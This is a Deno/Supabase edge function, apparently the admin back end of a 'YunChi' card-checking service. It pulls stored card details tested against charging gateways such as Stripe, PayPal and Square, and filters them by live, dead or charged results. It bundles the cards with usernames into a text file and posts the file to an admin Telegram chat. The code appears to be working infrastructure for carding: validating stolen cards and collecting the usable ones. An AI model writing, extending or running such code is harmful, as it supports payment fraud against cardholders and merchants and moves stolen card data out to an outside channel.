import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers":
    "authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
};

const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN")!;
const ADMIN_CHAT_ID = Deno.env.get("ADMIN_TELEGRAM_CHAT_ID")!;
const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;

const CHARGING_GATEWAYS = [
  "paygate_charge", "stripe_charge", "stripelow_charge", "payu_charge",
  "pwgate_charge", "rizzup_charge", "paypal_charge", "clover_charge",
  "square_charge", "shopify_charge",
];

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    // Verify admin
    const authHeader = req.headers.get("Authorization");
    if (!authHeader) {
      return new Response(JSON.stringify({ error: "No auth" }), {
        status: 401,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    const supabaseAdmin = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY);
    const supabaseUser = createClient(SUPABASE_URL, Deno.env.get("SUPABASE_ANON_KEY")!, {
      global: { headers: { Authorization: authHeader } },
    });

    const { data: { user } } = await supabaseUser.auth.getUser();
    if (!user) {
      return new Response(JSON.stringify({ error: "Unauthorized" }), {
        status: 401,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    // Check admin role
    const { data: roleData } = await supabaseAdmin
      .from("user_roles")
      .select("role")
      .eq("user_id", user.id)
      .eq("role", "admin")
      .maybeSingle();

    if (!roleData) {
      return new Response(JSON.stringify({ error: "Admin access required" }), {
        status: 403,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    const { exportType = "all", searchUser = "" } = await req.json();

    // Build query
    let query = supabaseAdmin
      .from("card_checks")
      .select("card_details, gateway, result, user_id, created_at")
      .order("created_at", { ascending: false });

    if (exportType === "live") {
      query = query.or("result.ilike.%live%,result.ilike.%approved%,result.ilike.%charged%");
    } else if (exportType === "dead") {
      query = query.or("result.ilike.%dead%,result.ilike.%declined%");
    } else if (exportType === "charged") {
      query = query
        .in("gateway", CHARGING_GATEWAYS)
        .or("result.ilike.%live%,result.ilike.%approved%,result.ilike.%charged%");
    }

    // Paginated fetch
    const PAGE_SIZE = 1000;
    let allData: any[] = [];
    let from = 0;
    let hasMore = true;

    while (hasMore) {
      const { data, error } = await query.range(from, from + PAGE_SIZE - 1);
      if (error) throw error;
      if (!data || data.length === 0) {
        hasMore = false;
      } else {
        allData = allData.concat(data);
        from += PAGE_SIZE;
        if (data.length < PAGE_SIZE) hasMore = false;
      }
    }

    // Fetch usernames
    const uniqueUserIds = [...new Set(allData.map((r: any) => r.user_id))];
    const userMap: Record<string, string> = {};

    for (let i = 0; i < uniqueUserIds.length; i += 50) {
      const batch = uniqueUserIds.slice(i, i + 50);
      const { data: profiles } = await supabaseAdmin
        .from("profiles")
        .select("user_id, username")
        .in("user_id", batch);

      if (profiles) {
        profiles.forEach((p: any) => {
          userMap[p.user_id] = p.username || p.user_id;
        });
      }
    }

    let finalData = allData.map((r: any) => ({
      ...r,
      username: userMap[r.user_id] || r.user_id,
    }));

    // Filter by user search
    if (searchUser.trim()) {
      const q = searchUser.trim().toLowerCase();
      finalData = finalData.filter(
        (r: any) =>
          r.username?.toLowerCase().includes(q) ||
          r.user_id?.toLowerCase().includes(q)
      );
    }

    if (finalData.length === 0) {
      return new Response(
        JSON.stringify({ success: false, error: "No records found" }),
        { headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    // Build file content
    const typeLabel = exportType.toUpperCase();
    const lines = finalData.map((r: any) => {
      const card = r.card_details || "N/A";
      const gateway = r.gateway || "N/A";
      const usr = r.username || r.user_id;
      return `${card} | ${gateway} | ${usr}`;
    });

    const header = `# YunChi Card Export - ${typeLabel}\n# Total: ${finalData.length}\n# Date: ${new Date().toISOString()}\n# Filter: ${searchUser || "None"}\n\n`;
    const fileContent = header + lines.join("\n");
    const fileName = `yunchi-${exportType}-cards-${new Date().toISOString().split("T")[0]}.txt`;

    // Send as document via Telegram
    const formData = new FormData();
    formData.append("chat_id", ADMIN_CHAT_ID);
    formData.append("document", new Blob([fileContent], { type: "text/plain" }), fileName);
    formData.append("caption", `📁 *Card Export — ${typeLabel}*\n\n📊 Total: *${finalData.length.toLocaleString()}* records\n📅 Date: ${new Date().toISOString().split("T")[0]}${searchUser ? `\n🔍 User Filter: ${searchUser}` : ""}`);
    formData.append("parse_mode", "Markdown");

    const tgRes = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`,
      { method: "POST", body: formData }
    );

    const tgResult = await tgRes.json();

    if (!tgResult.ok) {
      console.error("Telegram error:", tgResult);
      return new Response(
        JSON.stringify({ success: false, error: "Failed to send to Telegram" }),
        { headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    return new Response(
      JSON.stringify({ success: true, count: finalData.length }),
      { headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );
  } catch (err) {
    console.error("Export error:", err);
    return new Response(
      JSON.stringify({ error: err.message }),
      { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );
  }
});
